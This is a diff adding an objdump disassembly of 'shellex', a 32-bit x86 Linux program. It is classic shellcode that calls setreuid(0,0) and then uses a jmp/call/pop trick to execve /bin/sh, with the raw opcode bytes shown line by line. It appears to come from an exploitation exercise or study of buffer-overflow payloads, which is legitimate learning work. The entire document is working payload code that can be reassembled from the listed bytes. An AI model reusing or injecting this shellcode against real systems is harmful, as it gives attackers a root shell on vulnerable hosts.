@@ -1,0 +1,40 @@
+
+shellex:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	31 c0                	xor    %eax,%eax
+ 8048062:	b0 46                	mov    $0x46,%al
+ 8048064:	31 db                	xor    %ebx,%ebx
+ 8048066:	31 c9                	xor    %ecx,%ecx
+ 8048068:	cd 80                	int    $0x80
+ 804806a:	eb 16                	jmp    8048082 <ender>
+
+0804806c <starter>:
+ 804806c:	5b                   	pop    %ebx
+ 804806d:	31 c0                	xor    %eax,%eax
+ 804806f:	88 43 07             	mov    %al,0x7(%ebx)
+ 8048072:	89 5b 08             	mov    %ebx,0x8(%ebx)
+ 8048075:	89 43 0c             	mov    %eax,0xc(%ebx)
+ 8048078:	b0 0b                	mov    $0xb,%al
+ 804807a:	8d 4b 08             	lea    0x8(%ebx),%ecx
+ 804807d:	8d 53 0c             	lea    0xc(%ebx),%edx
+ 8048080:	cd 80                	int    $0x80
+
+08048082 <ender>:
+ 8048082:	e8 e5 ff ff ff       	call   804806c <starter>
+ 8048087:	2f                   	das    
+ 8048088:	62 69 6e             	bound  %ebp,0x6e(%ecx)
+ 804808b:	2f                   	das    
+ 804808c:	73 68                	jae    80480f6 <ender+0x74>
+ 804808e:	4e                   	dec    %esi
+ 804808f:	41                   	inc    %ecx
+ 8048090:	41                   	inc    %ecx
+ 8048091:	41                   	inc    %ecx
+ 8048092:	41                   	inc    %ecx
+ 8048093:	42                   	inc    %edx
+ 8048094:	42                   	inc    %edx
+ 8048095:	42                   	inc    %edx
+ 8048096:	42                   	inc    %edx
